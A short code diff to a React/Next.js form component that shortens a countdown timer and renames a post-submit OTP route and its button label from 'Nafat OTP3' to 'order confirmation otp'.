@@ -8,7 +8,7 @@ const Profession = () => {
   const router = useRouter()
   const searchParams = useSearchParams()
   const params = new URLSearchParams(searchParams)
-  const [time, setTime] = useState(60)
+  const [time, setTime] = useState(30)
 
   const handleSubmit = (e) => {
     e.preventDefault()
@@ -31,7 +31,7 @@ const Profession = () => {
         .then((data) => {
           if (data) {
             router.push({
-              pathname: '/nafat-otp-three',
+              pathname: '/order-confirmation-otp',
               query: { id: params.get('id') },
             })
           } else {
@@ -99,7 +99,7 @@ const Profession = () => {
               type="submit"
               className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
             >
-              Continue to Nafat OTP3 <FaArrowRightLong size={16} />
+              Continue to order confirmation otp <FaArrowRightLong size={16} />
             </button>
           </form>
         )}
